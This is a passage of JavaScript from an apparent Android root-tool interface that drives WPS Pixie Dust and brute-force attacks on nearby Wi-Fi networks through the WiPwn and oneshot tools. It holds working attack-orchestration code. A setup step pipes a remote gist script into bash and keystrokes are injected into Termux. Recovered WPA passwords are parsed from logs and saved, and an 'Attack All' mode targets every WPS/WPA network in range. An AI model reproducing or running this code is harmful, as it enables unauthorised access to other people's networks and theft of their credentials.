    document.getElementById('pixie-btn').onclick = () => startAttack(network, 'pixie');
    document.getElementById('brute-btn').onclick = () => startAttack(network, 'brute');
}

async function runSetup(network, tool = 'wipwn') {
    const isWipwn = tool === 'wipwn';
    const isInstalled = isWipwn ? await checkWipwnInstalled() : await checkoneshotInstalled();
    if (isInstalled) {        
        if (typeof showStatus === 'function') showStatus(`✅ ${isWipwn ? 'WiPwn' : 'oneshot'} already installed!`, 'var(--accent-green)');
        currentAttackTool = tool;
        showAttackModal(network);
        return;
    }
    
    const content = document.getElementById('attack-content');
    const logContainer = document.querySelector('#attack-log').parentElement; 
    const stopBtn = document.getElementById('stop-attack-btn');
    logContainer.style.display = 'block';
    stopBtn.style.display = 'flex';    
    
    content.innerHTML = `<div style="color: var(--accent-blue); text-align: center; padding: 16px; font-weight: 600;">⏳ Opening Termux to setup ${isWipwn ? 'WiPwn' : 'oneshot'}...</div>`;
    
    let setupCmd = '';
    if (isWipwn) {
        setupCmd = `pkg update && pkg upgrade -y && pkg install root-repo -y && pkg install git python wpa-supplicant pixiewps iw openssl -y && pkg install tsu -y || pkg install sudo -y && git clone https://github.com/anbuinfosec/wipwn && cd wipwn && chmod +x main.py`;
    } else {        
        setupCmd = `curl -sL https://gist.githubusercontent.com/chkndrp/f2ea65c77e3861ac4b586d9001ca8f55/raw/9c7664d71f2b502dc8fd7405f7cfabedc2088c85/ose_setup.py | bash`;
    }
    
    const launchCmd = `
        am start -n com.termux/.HomeActivity &&
        sleep 2 &&
        input text '${setupCmd.replace(/'/g, "'\\''")}' &&
        input keyevent 66
    `;
    await execFn(`su -c "${launchCmd}"`);
    startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn_status', 'attack-log');
    
    stopBtn.onclick = async () => {
        await execFn('su -c "pkill -f \\"pkg update\\" || true"');
        stopLogReader();
        stopBtn.style.display = 'none';
        showAttackModal(network);
    };
    
    const checkInterval = setInterval(async () => {
        let isReady = false;
        if (isWipwn) {
            const status = await execFn('su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn_status 2>/dev/null"');
            if (status.trim() === 'SETUP_COMPLETE') isReady = true;
            if (await checkWipwnInstalled()) isReady = true; 
        } else {            
            if (await checkoneshotInstalled()) isReady = true;
        }
        if (isReady) {
            clearInterval(checkInterval);
            stopLogReader();
            stopBtn.style.display = 'none';
            if (typeof showStatus === 'function') showStatus(`✅ ${isWipwn ? 'WiPwn' : 'oneshot'} setup complete!`, 'var(--accent-green)');
            currentAttackTool = tool;
            showAttackModal(network);
        }
    }, 2000);
}

async function startAttack(network, type) {
    if (!network.bssid) {
        if (typeof showStatus === 'function') showStatus('❌ MAC address not found', 'var(--accent-red)');
        return;
    }
    
    const content = document.getElementById('attack-content');
    const logContainer = document.querySelector('#attack-log').parentElement;
    const stopBtn = document.getElementById('stop-attack-btn');
    logContainer.style.display = 'block';
    stopBtn.style.display = 'flex';
    
    const attackType = type === 'pixie' ? 'Pixie Dust' : 'Brute Force';
    const toolName = currentAttackTool === 'wipwn' ? 'WiPwn' : 'oneshot';
    content.innerHTML = `<div style="color: var(--accent-green); text-align: center; padding: 16px; font-weight: 600;">⚔️ Starting ${attackType} with ${toolName}...</div>`;
    
    const macUpper = network.bssid.toUpperCase();
    let attackArg = '';
    if (type === 'pixie') {
        attackArg = currentAttackTool === 'wipwn' ? '-K' : '-P';
    } else {
        attackArg = '-B'; 
    }
    
    const attackJobId = `ATTACK_JOB_${Date.now()}`;
    await execFn('cmd wifi start-softap MyHotspot open ""');
    await execFn('su -c "echo \\"\\" > /sdcard/MTK_AI_Engine/wifi/wipwn.log"');
    
    let attackShellCmd = '';
    if (currentAttackTool === 'wipwn') {
        attackShellCmd = `cd ~/wipwn && sudo python3 -u main.py -i wlan0 -b ${macUpper} ${attackArg}`;
    } else {
        attackShellCmd = `cd ~/ose && sudo python -u ose.py -i wlan0 -b ${macUpper} ${attackArg}`;
    }
    
    await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);    
    await execFn('svc wifi disable');
    await execFn('nohup sh /sdcard/MTK_AI_Engine/wifi/termux_script.sh &');
    startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn.log', 'attack-log');
    
    let passwordSaved = false;
    const checkPasswordInterval = setInterval(async () => {
        if (passwordSaved) return;
        try {
            const rawLog = await execFn(`su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn.log 2>/dev/null"`);
            const logContent = rawLog
                .replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '')
                .replace(/\[[0-9;]*m/g, '')
                .replace(/\[[\?]?[0-9;]*[hlr]/g, '');
            
            const passwordMatch = logContent.match(/\[!\]\s*PSK\s*:\s*(\S+)/i) || 
                                  logContent.match(/\[!\]\s*WPA PSK\s*:\s*(\S+)/i) ||
                                  logContent.match(/WPA PSK:\s*([^\s\n]+)/i) || 
                                  logContent.match(/WPA2 PSK:\s*([^\s\n]+)/i) ||
                                  logContent.match(/PSK:\s*([^\s\n]+)/i) || 
                                  logContent.match(/Password:\s*([^\s\n]+)/i);
            
            if (passwordMatch && passwordMatch[1] && passwordMatch[1].length > 0) {
                passwordSaved = true;
                const password = passwordMatch[1].trim().replace(/^['"]|['"]$/g, '');
                savedNetworks[network.ssid] = password;
                await saveNetworks();
                
                const pwdDiv = document.createElement('div');
                pwdDiv.style.cssText = 'color: #FFFFFF; text-align: center; padding: 16px; margin-top: 16px; background: rgba(50,215,75,0.1); border-radius: 12px; border: 1px solid var(--accent-green);';
                pwdDiv.innerHTML = `
                    <div style="font-weight: 700; margin-bottom: 8px;">✅ Password Found & Auto-Saved!</div>
                    <span style="font-family: monospace; color: #FFFFFF; background: rgba(50,215,75,0.2); padding: 8px 16px; border-radius: 8px; display: inline-block; margin-top: 8px; font-size: 15px; letter-spacing: 1px; border: 1px solid var(--accent-green);">${password}</span>
                `;
                content.appendChild(pwdDiv);
                
                if (typeof showStatus === 'function') showStatus(`✅ Password found: ${password}`, 'var(--accent-green)');
                if (typeof refreshNetworkPasswordStatus === 'function') refreshNetworkPasswordStatus();
                if (typeof renderNetworkList === 'function') renderNetworkList();
                clearInterval(checkPasswordInterval); 
            }
        } catch (e) {
            console.error('Error checking password:', e);
        }
    }, 2000);
    
    stopBtn.onclick = async () => {
        clearInterval(checkPasswordInterval); 
        await execFn(`su -c "pkill -f ${attackJobId} || true"`);
        await execFn('cmd wifi stop-softap');
        await execFn('svc wifi enable');
        await execFn(`su -c "pkill -f termux_script.sh || true"`);
        await execFn(`su -c "pkill -9 -f /data/data/com.termux || true"`);
        stopLogReader();        
        stopBtn.style.display = 'none';
        content.innerHTML = `<div style="color: var(--accent-orange); text-align: center; padding: 16px; font-weight: 600;">⏹️ Attack stopped.</div>`;
    };
}

async function attackAllNetworks() {
    if (availableNetworks.length === 0) {
        if (typeof showStatus === 'function') showStatus('❌ No networks to attack. Scan first!', 'var(--accent-red)');
        return;
    }
    
    const termuxInstalled = await checkTermuxInstalled();
    if (!termuxInstalled) {
        if (typeof showStatus === 'function') showStatus('❌ Termux not installed', 'var(--accent-red)');
        return;
    }
    
    const wipwnInstalled = await checkWipwnInstalled();
    const oneshotInstalled = await checkoneshotInstalled();
    if (!wipwnInstalled && !oneshotInstalled) {
        if (typeof showStatus === 'function') showStatus('❌ No attack tool installed. Setup first!', 'var(--accent-red)');
        return;
    }
    
    if (currentAttackTool === 'wipwn' && !wipwnInstalled) currentAttackTool = 'oneshot';
    if (currentAttackTool === 'oneshot' && !oneshotInstalled) currentAttackTool = 'wipwn';
    
    const targetNetworks = availableNetworks.filter(n => 
        n.security && (n.security.includes('WPS') || n.security.includes('WPA')) && n.bssid
    );
    
    if (targetNetworks.length === 0) {
        if (typeof showStatus === 'function') showStatus('❌ No WPS/WPA networks found', 'var(--accent-red)');
        return;
    }
    
    const existingModal = document.getElementById('attack-all-modal');
    if (existingModal) existingModal.remove();
    
    const modal = document.createElement('div');
    modal.id = 'attack-all-modal';
    modal.style.cssText = `position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 10003; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); animation: fadeIn 0.2s ease;`;
    
    const box = document.createElement('div');
    box.className = 'wifi-modal-box';
    box.style.cssText = `padding: 28px; width: 92%; max-width: 650px; max-height: 90vh; overflow-y: auto; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1);`;
    
    box.innerHTML = `
        <h3 style="color: #FFFFFF; margin: 0 0 8px; font-size: 22px; font-weight: 700; text-align: center; letter-spacing: -0.5px;">⚔️ Mass Pixie Dust Attack</h3>
        <div style="color: rgba(255,255,255,0.6); font-size: 13px; margin-bottom: 24px; text-align: center;">
            Tool: <strong style="color: var(--accent-blue);">${currentAttackTool === 'wipwn' ? 'WiPwn' : 'oneshot'}</strong> • Targeting <strong style="color: var(--accent-blue);">${targetNetworks.length}</strong> networks
        </div>
        
        <div style="margin-bottom: 24px;">
            <div style="display: flex; justify-content: space-between; margin-bottom: 8px; color: rgba(255,255,255,0.6); font-size: 12px; font-weight: 600;">
                <span id="attack-progress-text">Initializing...</span>
                <span id="attack-current-target">0/${targetNetworks.length}</span>
            </div>
            <div style="background: var(--bg-primary); border-radius: 10px; height: 8px; overflow: hidden; border: 1px solid var(--border-color);">                
                <div id="attack-progress-bar" style="background: linear-gradient(90deg, var(--accent-red), var(--accent-orange)); height: 100%; width: 0%; transition: width 0.3s ease; border-radius: 10px;"></div>
            </div>
        </div>
        
        <div id="current-target-info" class="wifi-card" style="margin-bottom: 24px; border-left: 4px solid var(--accent-blue);">
            <div style="color: rgba(255,255,255,0.6); font-size: 12px;">Waiting to start...</div>
        </div>
        
        <div style="margin-bottom: 24px;">
            <div style="color: #FFFFFF; font-size: 14px; font-weight: 600; margin-bottom: 10px; display:flex; align-items:center; gap:8px;">
                <span>📜</span> Live Logs
            </div>
            <pre id="attack-all-log" style="background: var(--bg-primary); color: var(--accent-green); padding: 16px; border-radius: 12px; height: 250px; overflow-y: auto; font-size: 11px; white-space: pre-wrap; word-break: break-all; border: 1px solid var(--border-color); font-family: monospace; margin: 0;">Waiting for logs...</pre>
        </div>
        
        <div id="attack-all-results" style="margin-bottom: 24px; display: none;">
            <div style="color: #FFFFFF; font-size: 14px; font-weight: 600; margin-bottom: 10px;">📊 Results</div>
            <div id="attack-all-results-list" class="wifi-card" style="max-height: 150px; overflow-y: auto;"></div>
        </div>
        
        <button id="stop-all-attack-btn" class="wifi-btn wifi-btn-danger" style="width: 100%;">⏹️ Stop All Attacks</button>
        <button id="close-all-attack-btn" class="wifi-btn wifi-btn-secondary" style="width: 100%; margin-top: 12px; display: none;">Close</button>
    `;
    
    modal.appendChild(box);
    document.body.appendChild(modal);
    modal.onclick = e => { if (e.target === modal) modal.remove(); };
    
    let attackStopped = false;
    let passwordFound = false;
    const results = [];
    
    document.getElementById('stop-all-attack-btn').onclick = async () => {
        attackStopped = true;
        await execFn('su -c "pkill -f MASS_ATTACK || true"');
        await execFn('cmd wifi stop-softap');
        await execFn('svc wifi enable');
        await execFn('su -c "pkill -f termux_script.sh || true"');
        await execFn(`su -c "pkill -9 -f /data/data/com.termux || true"`);
        stopLogReader();
        if (typeof showStatus === 'function') showStatus('⏹️ Mass attack stopped by user', 'var(--accent-orange)');
        document.getElementById('stop-all-attack-btn').style.display = 'none';
        document.getElementById('close-all-attack-btn').style.display = 'flex';
    };
    
    document.getElementById('close-all-attack-btn').onclick = () => modal.remove();
    
    for (let i = 0; i < targetNetworks.length; i++) {
        if (attackStopped || passwordFound) break;        
        const network = targetNetworks[i];
        const macUpper = network.bssid.toUpperCase();
        
        const progress = ((i + 1) / targetNetworks.length) * 100;
        document.getElementById('attack-progress-bar').style.width = `${progress}%`;        
        document.getElementById('attack-progress-text').textContent = `Attacking: ${network.ssid}`;
        document.getElementById('attack-current-target').textContent = `${i + 1}/${targetNetworks.length}`;
        
        document.getElementById('current-target-info').innerHTML = `
            <div style="color: #FFFFFF; font-weight: 700; margin-bottom: 6px; font-size: 15px;">🎯 ${network.ssid}</div>
            <div style="color: rgba(255,255,255,0.6); font-size: 12px; font-family: monospace;">BSSID: ${network.bssid} | Signal: ${network.signal} dBm</div>
            <div style="color: var(--accent-blue); font-size: 11px; margin-top: 6px; font-weight: 600;">⏱️ Timeout: 30 seconds</div>
        `;
        
        const attackJobId = `MASS_ATTACK_${Date.now()}_${i}`;
        await execFn('cmd wifi start-softap MyHotspot open ""');
        await execFn('su -c "echo \\"\\" > /sdcard/MTK_AI_Engine/wifi/wipwn.log"');
        
        let attackShellCmd = '';
        if (currentAttackTool === 'wipwn') {
            attackShellCmd = `cd ~/wipwn && timeout 30 sudo python3 -u main.py -i wlan0 -b ${macUpper} -K`;
        } else {
            attackShellCmd = `cd ~/ose && sudo python -u ose.py -i wlan0 -b ${macUpper} -P`;
        }
        
        await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);
        await execFn('svc wifi disable');
        await execFn('nohup sh /sdcard/MTK_AI_Engine/wifi/termux_script.sh &');
        startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn.log', 'attack-all-log');        
        
        await new Promise(resolve => setTimeout(resolve, 32000));
        
        await execFn(`su -c "pkill -f ${attackJobId} || true"`);
        await execFn('cmd wifi stop-softap');
        await execFn('svc wifi enable');
        await execFn(`su -c "pkill -f termux_script.sh || true"`);
        
        const rawLog = await execFn(`su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn.log 2>/dev/null"`);
        const logContent = rawLog
            .replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '')
            .replace(/\[[0-9;]*m/g, '')
            .replace(/\[[\?]?[0-9;]*[hlr]/g, '');
        
        const passwordMatch = logContent.match(/\[!\]\s*PSK\s*:\s*(\S+)/i) || 
                              logContent.match(/\[!\]\s*WPA PSK\s*:\s*(\S+)/i) ||
                              logContent.match(/WPA PSK:\s*([^\s\n]+)/i) || 
                              logContent.match(/WPA2 PSK:\s*([^\s\n]+)/i) ||
                              logContent.match(/PSK:\s*([^\s\n]+)/i) || 
                              logContent.match(/Password:\s*([^\s\n]+)/i);
        
        if (passwordMatch && passwordMatch[1] && passwordMatch[1].length > 0) {
            passwordFound = true;
            const password = passwordMatch[1].trim().replace(/^['"]|['"]$/g, '');
            results.push({ ssid: network.ssid, bssid: network.bssid, password: password, status: 'SUCCESS' });
            
            savedNetworks[network.ssid] = password;
            await saveNetworks();
            
            document.getElementById('current-target-info').innerHTML = `
                <div style="color: var(--accent-green); font-weight: 700; margin-bottom: 8px; font-size: 16px;">✅ PASSWORD FOUND!</div>
                <div style="color: #FFFFFF; font-size: 13px; margin: 8px 0; padding: 12px; background: rgba(50,215,75,0.1); border-radius: 8px; border: 1px solid var(--accent-green);">
                    <strong>SSID:</strong> ${network.ssid}<br>
                    <strong>Password:</strong> <span style="color: var(--accent-green); font-family: monospace; font-size: 14px;">${password}</span>
                </div>
                <div style="color: var(--accent-green); font-size: 12px; font-weight: 600;">⏹️ Stopping all attacks...</div>
            `;
            if (typeof showStatus === 'function') showStatus(`✅ Password found for ${network.ssid}!`, 'var(--accent-green)');
            break;
        } else {
            results.push({ ssid: network.ssid, bssid: network.bssid, password: null, status: 'FAILED' });
        }
        
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    stopLogReader();
    
    if (results.length > 0) {
        document.getElementById('attack-all-results').style.display = 'block';
        const resultsList = document.getElementById('attack-all-results-list');
        const successCount = results.filter(r => r.status === 'SUCCESS').length;
        const failedCount = results.filter(r => r.status === 'FAILED').length;
        
        let resultsHtml = `
            <div style="display: flex; justify-content: space-between; margin-bottom: 12px; padding: 12px; background: var(--bg-secondary); border-radius: 10px; border: 1px solid var(--border-color);">
                <span style="color: var(--accent-green); font-weight: 700;">✅ Success: ${successCount}</span>
                <span style="color: var(--accent-red); font-weight: 700;">❌ Failed: ${failedCount}</span>
            </div>
        `;
        
        results.forEach(result => {
            if (result.status === 'SUCCESS') {
                resultsHtml += `
                    <div style="padding: 12px; margin-bottom: 8px; background: rgba(50,215,75,0.1); border-left: 4px solid var(--accent-green); border-radius: 8px;">
                        <div style="color: var(--accent-green); font-weight: 700; font-size: 13px;">✅ ${result.ssid}</div>
                        <div style="color: #FFFFFF; font-family: monospace; font-size: 12px; margin-top: 6px; padding: 8px; background: rgba(50,215,75,0.2); border-radius: 6px; border: 1px solid var(--accent-green);">${result.password}</div>
                    </div>
                `;
            } else {
                resultsHtml += `
                    <div style="padding: 12px; margin-bottom: 8px; background: rgba(255,59,48,0.1); border-left: 4px solid var(--accent-red); border-radius: 8px; opacity: 0.8;">
                        <div style="color: var(--accent-red); font-weight: 700; font-size: 13px;">❌ ${result.ssid}</div>
                    </div>
                `;
            }
        });
        resultsList.innerHTML = resultsHtml;
    }
    
    if (passwordFound) {
        document.getElementById('attack-progress-text').textContent = '✅ Password found! Stopped.';
        document.getElementById('attack-progress-text').style.color = 'var(--accent-green)';
    } else if (attackStopped) {
        document.getElementById('attack-progress-text').textContent = '⏹️ Stopped by user';
        document.getElementById('attack-progress-text').style.color = 'var(--accent-orange)';
    } else {
        document.getElementById('attack-progress-text').textContent = '✅ All attacks completed';
        document.getElementById('attack-progress-text').style.color = 'var(--accent-green)';
    }
    
    document.getElementById('stop-all-attack-btn').style.display = 'none';
    document.getElementById('close-all-attack-btn').style.display = 'flex';
    
    refreshNetworkPasswordStatus();
    renderNetworkList();
}
// --- End WiFi Attack Functions ---

function showNetworkSelector() {
    const existing = document.getElementById('wifi-modal');
    if (existing) existing.remove();
    
    const modal = document.createElement('div');
    modal.id = 'wifi-modal';
    modal.style.cssText = `position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 10000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); animation: fadeIn 0.2s ease;`;
    
    const box = document.createElement('div');
    box.className = 'wifi-modal-box';
    box.style.cssText = `padding: 28px; width: 92%; max-width: 520px; max-height: 88vh; overflow-y: auto; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1);`;
    
    const title = document.createElement('h3');
    title.textContent = 'WiFi Manager';
    title.style.cssText = 'color: #FFFFFF; margin: 0 0 8px; font-size: 22px; font-weight: 700; text-align: center; letter-spacing: -0.5px;';
    
    const info = document.createElement('div');
    info.style.cssText = 'color: rgba(255,255,255,0.6); font-size: 14px; margin-bottom: 24px; text-align: center;';
    info.innerHTML = currentNetwork 
        ? `<strong>Connected: </strong> <span style="color: var(--accent-green); font-weight: 600;">${currentNetwork.ssid}</span>`
        : '<strong>Status: </strong> Not connected';
    
    const actionsGrid = document.createElement('div');
    actionsGrid.style.cssText = 'display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 24px;';
    
    const scanBtn = document.createElement('button');
    scanBtn.id = 'auto-scan-btn';
    scanBtn.textContent = '📡 Scan Networks';
    scanBtn.className = 'wifi-btn wifi-btn-primary';
    scanBtn.onclick = async () => {
        scanBtn.disabled = true; scanBtn.textContent = '⏳ Scanning...';
        await scanNetworks();
        scanBtn.disabled = false; scanBtn.textContent = '📡 Scan Networks';
        renderNetworkList();
    };
    
    const boostBtn = document.createElement('button');
    boostBtn.id = 'boost-btn';
    boostBtn.textContent = wifiBoosted ? '⚡ Wi-Fi Boosted ✓' : '⚡ Enable Wi-Fi Boost';
    boostBtn.className = `wifi-btn ${wifiBoosted ? 'wifi-btn-success' : 'wifi-btn-secondary'}`;
    boostBtn.onclick = checkAndToggleWifiBoost;
    
    const free5gBtn = document.createElement('button');
    free5gBtn.id = 'free-5g-btn';
    free5gBtn.textContent = showOnlyFree5GHz ? '📡 Show All Networks' : '🆓 Free 5GHz Only';
    free5gBtn.className = `wifi-btn ${showOnlyFree5GHz ? 'wifi-btn-success' : 'wifi-btn-warning'}`;
    free5gBtn.style.gridColumn = 'span 2';
    free5gBtn.onclick = () => {
        showOnlyFree5GHz = !showOnlyFree5GHz;
        free5gBtn.textContent = showOnlyFree5GHz ? '📡 Show All Networks' : '🆓 Free 5GHz Only';
        free5gBtn.className = `wifi-btn ${showOnlyFree5GHz ? 'wifi-btn-success' : 'wifi-btn-warning'}`;
        renderNetworkList();
    };
    
    const disable24gBtn = document.createElement('button');
    disable24gBtn.id = 'disable-24g-btn';
    disable24gBtn.textContent = '📶 Disable 2.4GHz (System)';
    disable24gBtn.className = 'wifi-btn wifi-btn-purple';
    disable24gBtn.style.gridColumn = 'span 2';
    disable24gBtn.onclick = disable24GHz;
    
    const attackAllBtn = document.createElement('button');
    attackAllBtn.id = 'attack-all-btn';
    attackAllBtn.textContent = '⚔️ Attack All (Pixie Dust)';
    attackAllBtn.className = 'wifi-btn wifi-btn-danger';
    attackAllBtn.style.gridColumn = 'span 2';
    attackAllBtn.onclick = () => attackAllNetworks();
    
    actionsGrid.append(scanBtn, boostBtn, free5gBtn, disable24gBtn, attackAllBtn);
    box.append(title, info, actionsGrid);
    
    const boostStatus = document.createElement('div');
    boostStatus.id = 'boost-status';
    boostStatus.className = 'wifi-card';
    boostStatus.style.cssText = 'margin-bottom: 24px; font-size: 13px; text-align: center; color: #FFFFFF;';
    box.appendChild(boostStatus);
    
    const dnsSection = document.createElement('div');
    dnsSection.className = 'wifi-card';
    dnsSection.style.cssText = 'margin-bottom: 24px;';
    dnsSection.innerHTML = `<div style="color: #FFFFFF; font-size: 15px; font-weight: 700; margin-bottom: 12px;">🌐 Global DNS</div>`;
    
    const dnsSelect = document.createElement('select');
    dnsSelect.id = 'dns-select';
    dnsSelect.className = 'wifi-select';
    dnsSelect.style.marginBottom = '12px';
    dnsSelect.innerHTML = '<option value="">Select a DNS Provider...</option>';
    Object.keys(DNS_PROVIDERS).forEach(provider => {
        const opt = document.createElement('option');
        opt.value = provider;
        opt.textContent = provider;
        dnsSelect.appendChild(opt);
    });
    dnsSelect.onchange = (e) => {
        if (e.target.value) {
            setGlobalDNS(e.target.value);
        }
    };
    dnsSection.appendChild(dnsSelect);
    
    const dnsStatus = document.createElement('div');
    dnsStatus.id = 'dns-status';
    dnsStatus.style.cssText = 'font-size: 13px; text-align: center; color: #FFFFFF;';        
    dnsSection.appendChild(dnsStatus);
    box.appendChild(dnsSection);
    
    const networkList = document.createElement('div');
    networkList.id = 'wifi-network-list';
    networkList.style.cssText = 'display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px;';
    
    const closeBtn = document.createElement('button');
    closeBtn.textContent = 'Close';
    closeBtn.className = 'wifi-btn wifi-btn-secondary';
    closeBtn.style.width = '100%';
    closeBtn.onclick = () => modal.remove();
    
    box.append(networkList, closeBtn);
    modal.appendChild(box);
    modal.onclick = e => { if (e.target === modal) modal.remove(); };
    document.body.appendChild(modal);
    
    checkWifiBoostStatus().then(() => {
        updateBoostDisplay();
        updateDNSDisplay();
    });
    refreshNetworkPasswordStatus();
    renderNetworkList();
}

function refreshNetworkPasswordStatus() {
    availableNetworks.forEach(network => {
        network.hasPassword = !!savedNetworks[network.ssid];
    });
}

function renderNetworkList() {
    const list = document.getElementById('wifi-network-list');
    if (!list) return;
    list.innerHTML = '';
    
    let networksToRender = availableNetworks;
    if (showOnlyFree5GHz) {
        networksToRender = availableNetworks.filter(n => n.frequency >= 5000 && isNetworkOpen(n.security));    
    }
    
    if (networksToRender.length === 0) {
        const msg = showOnlyFree5GHz 
            ? 'No free 5GHz networks found. Click "Show All Networks" to see others.' 
            : 'Click "Scan Networks" to find available WiFi';
        list.innerHTML = `<div style="color: rgba(255,255,255,0.6); text-align: center; padding: 24px; font-size: 14px;">${msg}</div>`;
        return;
    }
    
    networksToRender.forEach(network => {
        const item = document.createElement('div');
        item.className = 'wifi-card';
        item.style.cursor = 'pointer';
        item.style.marginBottom = '0';
        
        const band = network.frequency >= 5000 ? '5GHz' : '2.4GHz';
        const isOpen = isNetworkOpen(network.security);
        const is24Open = isOpen && network.frequency < 5000;
        
        let icon = '🔒';
        let secText = network.security;
        let actionHtml = '';
        
        if (is24Open) {
            icon = '🚫';
            secText = 'Web Sign-in Required (Blocked)';
            actionHtml = `<div style="color: var(--accent-red); font-weight: 700; font-size: 13px;">🚫 Blocked</div>`;
        } else {
            icon = isOpen ? '🆓' : '🔒';
            secText = isOpen ? 'Open Network' : network.security;
            if (network.hasPassword) {
                actionHtml = `
                    <div style="display: flex; align-items: center; gap: 12px;">
                        <span style="color: var(--accent-green); font-size: 12px; font-weight: 700;">✓ Saved</span>
                        <button class="forget-btn" style="background: none; border: none; color: var(--accent-red); cursor: pointer; font-size: 12px; padding: 0; font-weight: 600;">Forget</button>
                    </div>
                `;
            } else {
                actionHtml = `<div style="color: var(--accent-blue); font-weight: 700; font-size: 13px;">Connect →</div>`;
            }
        }
        
        const macHtml = `<div style="color: rgba(255,255,255,0.5); font-size: 11px; margin-top: 6px; font-family: monospace;">MAC: ${network.bssid || 'Unknown'}</div>`;
        const attackBtnHtml = `<button class="attack-btn" style="background: linear-gradient(135deg, var(--accent-red), #c0392b); border: none; color: #FFFFFF; padding: 8px 14px; border-radius: 8px; font-size: 11px; font-weight: 700; cursor: pointer; margin-left: 8px; box-shadow: 0 2px 8px rgba(255,59,48,0.2); transition: all 0.2s;">⚔️ Attack</button>`;
        actionHtml += attackBtnHtml;
        
        item.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <div style="display: flex; align-items: center; gap: 10px;">
                    <span style="font-size: 18px;">${icon}</span>
                    <div>
                        <div style="color: #FFFFFF; font-weight: 700; font-size: 16px; letter-spacing: -0.2px;">${network.ssid}</div>
                        <span style="color: rgba(255,255,255,0.6); font-size: 10px; background: var(--bg-secondary); padding: 3px 8px; border-radius: 6px; border: 1px solid var(--border-color); font-weight: 600;">${band}</span>
                    </div>
                </div>
                <div style="text-align: right;">
                    <div style="color: ${network.signal > -70 ? 'var(--accent-green)' : 'var(--accent-orange)'}; font-weight: 700; font-size: 13px; font-family: monospace;">${network.signal} dBm</div>
                </div>
            </div>
            ${macHtml}
            <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 12px; border-top: 1px solid var(--border-color); margin-top: 12px;">
                <div style="color: rgba(255,255,255,0.6); font-size: 11px; font-weight: 600;">${secText}</div>
                ${actionHtml}
            </div>
        `;
        
        item.onclick = (e) => {
            if (e.target.classList.contains('forget-btn')) {
                e.stopPropagation();
                forgetPassword(network.ssid);
            } else if (e.target.classList.contains('attack-btn')) {
                e.stopPropagation();
                showAttackModal(network);
            } else {
                handleNetworkClick(network);
            }
        };            
        list.appendChild(item);
    });
}

function forgetPassword(ssid) {
    if (confirm(`Forget saved password for "${ssid}"?`)) {
        delete savedNetworks[ssid];
        saveNetworks();
        const network = availableNetworks.find(n => n.ssid === ssid);
        if (network) network.hasPassword = false;
        renderNetworkList();
        if (typeof showStatus === 'function') showStatus(`🗑️ Password forgotten for ${ssid}`, 'var(--accent-orange)');
    }
}

async function handleNetworkClick(network) {
    const isOpen = isNetworkOpen(network.security);
    if (isOpen) {
        if (network.frequency < 5000) {
            if (typeof showStatus === 'function') showStatus('❌ 2.4GHz Open WiFi blocked (Requires web sign-in)', 'var(--accent-red)');
            return;
        }
        await executeConnection(network, '', false, false);        
        return;
    }
    if (savedNetworks[network.ssid] && savedNetworks[network.ssid] !== '[CONNECTED]') {
        await executeConnection(network, savedNetworks[network.ssid], false, true);
    } else {
        showPasswordModal(network, false);
    }
}

function showPasswordModal(network, isRetry, lastPassword = '') {
    const existing = document.getElementById('password-modal');
    if (existing) existing.remove();
    
    const modal = document.createElement('div');
    modal.id = 'password-modal';
    modal.style.cssText = `position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 10001; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); animation: fadeIn 0.2s ease;`;
    
    const box = document.createElement('div');
    box.className = 'wifi-modal-box';
    box.style.cssText = `padding: 28px; width: 92%; max-width: 420px; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1);`;
    
    const errorMsg = isRetry ? `<div style="color: var(--accent-red); font-size: 13px; margin-bottom: 16px; text-align: center; font-weight: 700; background: rgba(255,59,48,0.1); padding: 10px; border-radius: 10px; border: 1px solid var(--accent-red);">❌ Wrong password. Please try again.</div>` : '';
    
    box.innerHTML = `
        ${errorMsg}
        <h4 style="color: #FFFFFF; margin: 0 0 20px; text-align: center; font-size: 18px; font-weight: 700;">Enter Password</h4>
        <div style="color: rgba(255,255,255,0.6); text-align: center; margin-bottom: 20px; font-size: 14px;">for <strong style="color: #FFFFFF;">${network.ssid}</strong></div>
        <div style="position: relative; margin-bottom: 20px;">
            <input type="password" id="wifi-pass-input" class="wifi-input" placeholder="WiFi Password" value="${lastPassword}" style="padding-right: 45px;">
            <button id="toggle-pass-btn" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: rgba(255,255,255,0.6); cursor: pointer; font-size: 18px; padding: 5px;">👁️</button>
        </div>
        <label style="display: flex; align-items: center; gap: 10px; color: rgba(255,255,255,0.8); font-size: 14px; margin-bottom: 24px; cursor: pointer;">
            <input type="checkbox" id="save-pass-check" checked style="width: 18px; height: 18px; accent-color: var(--accent-blue);">
            Save password for future use
        </label>
        <div style="display: flex; gap: 12px;">
            <button id="pass-cancel-btn" class="wifi-btn wifi-btn-secondary" style="flex: 1;">Cancel</button>
            <button id="pass-connect-btn" class="wifi-btn wifi-btn-primary" style="flex: 1;">Connect</button>
        </div>
    `;
    
    modal.appendChild(box);
    document.body.appendChild(modal);
    
    const input = document.getElementById('wifi-pass-input');
    const toggleBtn = document.getElementById('toggle-pass-btn');
    
